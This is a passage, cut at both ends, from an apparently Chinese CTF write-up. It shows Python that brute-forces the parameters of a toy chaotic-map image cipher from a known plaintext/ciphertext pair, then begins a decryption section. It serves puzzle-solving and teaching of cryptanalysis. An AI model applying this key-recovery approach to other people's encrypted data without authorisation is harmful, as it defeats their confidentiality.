class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>, <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>, <span class="number">79</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>, <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">140</span>, <span class="number">143</span>, <span class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x), <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pixel, key1, key2, x0, m, n</span>):</span></span><br><span class="line">    num = m*n//<span class="number">8</span></span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 64个零</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">key1key2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    a = testimage[i] ^ encrypt_testimage[i]</span><br><span class="line">    <span class="comment"># a 就是前16个key1和key2的组合</span></span><br><span class="line">    key1key2.append(encrypt_testimage[i] ^ a &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">x0 = <span class="number">0.999999</span></span><br><span class="line"></span><br><span class="line">list_r = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>]</span><br><span class="line">keys1 = [<span class="number">78</span>, <span class="number">177</span>]</span><br><span class="line">keys2 = [<span class="number">86</span>, <span class="number">169</span>]</span><br><span class="line"><span class="keyword">while</span> x0 &gt;= <span class="number">0.000001</span>:</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> list_r:</span><br><span class="line">        c = []</span><br><span class="line">        <span class="keyword">for</span> key1 <span class="keyword">in</span> keys1:</span><br><span class="line">            <span class="keyword">for</span> key2 <span class="keyword">in</span> keys2:</span><br><span class="line">                cipher = encrypt(testimage, key1, key2, x0, <span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> cipher == encrypt_testimage:</span><br><span class="line">                    <span class="built_in">print</span>(r, x0, key1, key2)</span><br><span class="line">        <span class="keyword">for</span> key2 <span class="keyword">in</span> keys1:</span><br><span class="line">            <span class="keyword">for</span> key1 <span class="keyword">in</span> keys2:</span><br><span class="line">                cipher = encrypt(testimage, key1, key2, x0, <span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> cipher == encrypt_testimage:</span><br><span class="line">                    <span class="built_in">print</span>(r, x0, key1, key2)</span><br><span class="line">    x0 = <span class="built_in">round</span>(x0-<span class="number">0.000001</span>, <span class="number">6</span>)</span><br><span class="line">    <span class="built_in">print</span>(x0)</span><br></pre></td></tr></table></figure>

<h3 id="三、解密"><a href="#三、解密" class="headerlink" title="三、解密"></a>三、解密</h3><p>爆出这些东西，应该就可以搞了，其实加密函数同时也是解密函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">encrypt_flagimage = [<span class="number">198</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">3</span>, <span class="number">152</span>, <span class="number">139</span>, <span class="number">131</span>, <span class="number">84</span>, <span class="number">181</span>, <span class="number">180</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">192</span>, <span class="number">25</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">136</span>, <span class="number">107</span>, <span class="number">190</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">238</span>, <span class="number">117</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">116</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">214</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">209</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">196</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">225</span>, <span class="number">214</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">231</span>, <span class="number">204</span>, <span class="number">150</span>, <span class="number">204</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">142</span>, <span class="number">213</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">166</span>, <span class="number">65</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">189</span>, <span class="number">148</span>, <span class="number">38</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">31</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">86</span>, <span class="number">188</span>, <span class="number">86</span>, <span class="number">233</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">7</span>, <span class="number">212</span>, <span class="number">234</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">102</span>, <span class="number">227</span>, <span class="number">96</span>, <span class="number">160</span>, <span class="number">67</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">210</span>, <span class="number">188</span>, <span class="number">84</span>, <span class="number">216</span>, <span class="number">215</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">233</span>, <span class="number">2</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">107</span>, <span class="number">251</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">94</span>, <span class="number">190</span>, <span class="number">185</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">29</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">208</span>, <span class="number">228</span>, <span class="number">252</span>, <span class="number">73</span>, <span class="number">198</span>, <span class="number">151</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">97</span>, <span class="number">138</span>, <span class="number">235</span>, <span class="number">21</span>, <span class="number">117</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">253</span>, <span class="number">80</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">184</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">82</span>, <span class="number">37</span>, <span class="number">140</span>, <span class="number">23</span>, <span class="number">143</span>, <span class="number">179</span>, <span class="number">53</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">213</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">248</span>, <span class="number">65</span>, <span class="number">60</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">48</span>, <span class="number">254</span>, <span class="number">251</span>, <span class="number">89</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">190</span>, <span class="number">66</span>, <span class="number">174</span>, <span class="number">97</span>, <span class="number">175</span>, <span class="number">210</span>, <span class="number">191</span>, <span class="number">66</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">173</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">231</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">44</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">137</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">223</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">215</span>, <span class="number">133</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">224</span>, <span class="number">195</span>, <span class="number">140</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">156</span>, <span class="number">221</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">9</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">225</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">119</span>, <span class="number">63</span>, <span class="number">160</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">199</span>, <span class="number">86</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">135</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">241</span>, <span class="number">49</span>, <span class="number">249</span>, <span class="number">182</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">155</span>, <span class="number">157</span>, <span class="number">61</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">195</span>, <span class="number">54</span>, <span class="number">139</span>, <span class="number">232</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">11</span>, <span class="number">233</span>, <span class="number">58</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">137</span>, <span class="number">83</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">96</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">237</span>, <span class="number">124</span>, <span class="number">177</span>, <span class="number">166</span>, <span class="number">161</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">112</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">192</span>, <span class="number">147</span>, <span class="number">5</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">174</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">16</span>, <span class="number">188</span>, <span class="number">103</span>, <span class="number">187</span>, <span class="number">11</span>, <span class="number">238</span>, <span class="number">182</span>, <span class="number">144</span>, <span class="number">4</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">30</span>, <span class="number">198</span>, <span class="number">220</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">5</span>, <span class="number">45</span>]</span><br><span class="line"></span><br><span class="line">testimage = [<span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>, <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>, <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>, <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>, <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>, <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">encrypt_testimage = [<span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>, <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">144</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>, <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>, <span class="number">79</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>, <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">140</span>, <span class="number">143</span>, <span class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x), <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span 